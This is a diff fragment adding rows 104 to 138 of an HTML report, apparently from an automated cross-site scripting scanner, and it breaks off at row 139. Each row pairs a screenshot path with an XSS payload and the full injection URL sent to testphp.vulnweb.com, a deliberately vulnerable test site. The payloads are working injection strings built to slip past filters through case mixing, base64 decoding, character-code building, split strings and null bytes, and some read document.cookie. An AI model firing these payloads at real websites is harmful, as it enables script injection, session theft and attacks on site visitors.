+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>104</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_9_940.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%20&quot;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2520%22%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2520%22%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>105</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_10_616.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/onload=alert(&#39;XSS&#39;)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3dalert(%27XSS%27)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3dalert(%27XSS%27)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>106</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_10_842.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;>&lt;/script>&lt;svg/onload=alert(document.cookie)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%27%3e%3c%2fscript%3e%3csvg%2fonload%3dalert(document.cookie)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%27%3e%3c%2fscript%3e%3csvg%2fonload%3dalert(document.cookie)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>107</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_10_933.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;noscript>&lt;img title=&quot;&lt;/noscript>&lt;img src onerror=alert(1)>&quot;>&lt;/noscript></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cnoscript%3e%3cimg+title%3d%22%3c%2fnoscript%3e%3cimg+src+onerror%3dalert(1)%3e%22%3e%3c%2fnoscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cnoscript%3e%3cimg+title%3d%22%3c%2fnoscript%3e%3cimg+src+onerror%3dalert(1)%3e%22%3e%3c%2fnoscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>108</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_11_723.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src onerror=confirm(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src+onerror%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src+onerror%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>109</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_11_770.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg id=alert(1) onload=eval(id)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+id%3dalert(1)+onload%3deval(id)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+id%3dalert(1)+onload%3deval(id)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>110</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_11_908.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;script>alert(&#39;XSS&#39;)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript%3ealert(%27XSS%27)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript%3ealert(%27XSS%27)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>111</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_12_53.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>anythinglr00&lt;/script>&lt;script>alert(document.domain)&lt;/script>uxldz</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>112</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_12_547.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>test+(&lt;script>alert(0)&lt;/script>)@gmail.com</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=test%2b(%3cscript%3ealert(0)%3c%2fscript%3e)%40gmail.com&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=test%2b(%3cscript%3ealert(0)%3c%2fscript%3e)%40gmail.com&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>113</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_13_100.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;body/oNpagEshoW=(confirm)(document.domain)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cbody%2foNpagEshoW%3d(confirm)(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cbody%2foNpagEshoW%3d(confirm)(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>114</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_13_717.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;Script>alert()&lt;/Script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cScript%3ealert()%3c%2fScript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cScript%3ealert()%3c%2fScript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>115</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_13_997.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe  src=&quot;&amp;Tab;javascript:prompt(1)&amp;Tab;&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe++src%3d%22%26Tab%3bjavascript%3aprompt(1)%26Tab%3b%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe++src%3d%22%26Tab%3bjavascript%3aprompt(1)%26Tab%3b%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>116</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_14_386.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>117</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_14_635.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;&quot;>&lt;details/open/ontoggle=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;/xss-by-tarun/&amp;rpar;&quot;>XXXXX&lt;/a></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%22%3e%3cdetails%2fopen%2fontoggle%3d%22jAvAsCrIpT%26colon%3balert%26lpar%3b%2fxss-by-tarun%2f%26rpar%3b%22%3eXXXXX%3c%2fa%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%22%3e%3cdetails%2fopen%2fontoggle%3d%22jAvAsCrIpT%26colon%3balert%26lpar%3b%2fxss-by-tarun%2f%26rpar%3b%22%3eXXXXX%3c%2fa%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>118</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_15_214.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dalert(String.fromCharCode(88%2c83%2c83))%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dalert(String.fromCharCode(88%2c83%2c83))%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>119</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_15_518.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3dsetTimeout(atob(%2fYWxlcnQoMTMzNyk%2f.source))%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3dsetTimeout(atob(%2fYWxlcnQoMTMzNyk%2f.source))%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>120</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_15_524.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/script>&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt(1)&quot;/%00*/onerror=&#39;eval(src)&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fscript%3e%3cimg%2f*%2500%2fsrc%3d%22worksinchrome%26colon%3bprompt(1)%22%2f%2500*%2fonerror%3d%27eval(src)%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fscript%3e%3cimg%2f*%2500%2fsrc%3d%22worksinchrome%26colon%3bprompt(1)%22%2f%2500*%2fonerror%3d%27eval(src)%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>121</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_15_890.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src/onerror=prompt(8)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%2fonerror%3dprompt(8)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%2fonerror%3dprompt(8)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>122</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_15_959.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>window[&#39;al&#39;+&#39;ert&#39;]()&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ewindow%5b%27al%27%2b%27ert%27%5d()%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ewindow%5b%27al%27%2b%27ert%27%5d()%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>123</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_16_329.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/pre>&lt;!-%00->&lt;svg/%0D%0A%0D%0A/Id=&quot;a&quot;/TABindex=&quot;1&quot;/onload=&quot;\u0061lert(1);&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fpre%3e%3c!-%2500-%3e%3csvg%2f%250D%250A%250D%250A%2fId%3d%22a%22%2fTABindex%3d%221%22%2fonload%3d%22%5cu0061lert(1)%3b%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fpre%3e%3c!-%2500-%3e%3csvg%2f%250D%250A%250D%250A%2fId%3d%22a%22%2fTABindex%3d%221%22%2fonload%3d%22%5cu0061lert(1)%3b%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>124</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_16_738.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%3F%20&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%253F%2520%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%253F%2520%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>125</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_16_750.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>/*\&quot;&lt;sVg/oNloAd=alert(document.domain)//>\x3e</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2f*%5c%22%3csVg%2foNloAd%3dalert(document.domain)%2f%2f%3e%5cx3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2f*%5c%22%3csVg%2foNloAd%3dalert(document.domain)%2f%2f%3e%5cx3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>126</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_16_843.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&#39;)&quot;&lt;!-->&lt;Svg OnLoad=(confirm)(1)&lt;!--</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=1%27)%22%3c!--%3e%3cSvg+OnLoad%3d(confirm)(1)%3c!--&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=1%27)%22%3c!--%3e%3cSvg+OnLoad%3d(confirm)(1)%3c!--&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>127</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_17_74.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg>&lt;script>a&lt;!>l&lt;!>e&lt;!>r&lt;!>t&lt;!>(&lt;!>1&lt;!>)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3cscript%3ea%3c!%3el%3c!%3ee%3c!%3er%3c!%3et%3c!%3e(%3c!%3e1%3c!%3e)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3cscript%3ea%3c!%3el%3c!%3ee%3c!%3er%3c!%3et%3c!%3e(%3c!%3e1%3c!%3e)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>128</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_17_344.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=&#39;new Function`[&quot;_Y000!_&quot;].find(al\u0065rt)`&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3d%27new+Function%60%5b%22_Y000!_%22%5d.find(al%5cu0065rt)%60%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3d%27new+Function%60%5b%22_Y000!_%22%5d.find(al%5cu0065rt)%60%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>129</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_17_971.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(document.domain); title=x></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b+title%3dx%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b+title%3dx%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>130</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_18_458.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>var{a:onerror}={a:alert};throw 1&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3evar%7ba%3aonerror%7d%3d%7ba%3aalert%7d%3bthrow+1%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3evar%7ba%3aonerror%7d%3d%7ba%3aalert%7d%3bthrow+1%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>131</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_18_725.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;sVg/onfake=&quot;x=y&quot;oNload=;1^(co\u006efirm)``^1//</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csVg%2fonfake%3d%22x%3dy%22oNload%3d%3b1%5e(co%5cu006efirm)%60%60%5e1%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csVg%2fonfake%3d%22x%3dy%22oNload%3d%3b1%5e(co%5cu006efirm)%60%60%5e1%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>132</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_18_936.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;body onload=&quot;eval(atob(&#39;YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk=&#39;))&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onload%3d%22eval(atob(%27YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk%3d%27))%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onload%3d%22eval(atob(%27YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk%3d%27))%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>133</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_19_6.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert`1`&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert%601%60%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert%601%60%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>134</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_19_197.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%0d%0a%20&lt;body onload=alert(&quot;bingo&quot;)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%3cbody+onload%3dalert(%22bingo%22)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%3cbody+onload%3dalert(%22bingo%22)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>135</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_19_321.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;!-->&lt;script>confirm/**/()/**/&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c!--%3e%3cscript%3econfirm%2f**%2f()%2f**%2f%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c!--%3e%3cscript%3econfirm%2f**%2f()%2f**%2f%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>136</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_19_871.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3dlocation%3d%60javas%60%2b%60cript%3aale%60%2b%60rt%252%60%2b%6081%252%60%2b%609%60%3b%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3dlocation%3d%60javas%60%2b%60cript%3aale%60%2b%60rt%252%60%2b%6081%252%60%2b%609%60%3b%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>137</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_20_432.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>onerror=alert;throw 1337&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eonerror%3dalert%3bthrow+1337%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eonerror%3dalert%3bthrow+1337%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>138</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_21_380.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(&#39;document.domain&#39;);>.php</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(%27document.domain%27)%3b%3e.php&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(%27document.domain%27)%3b%3e.php&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>139</td>
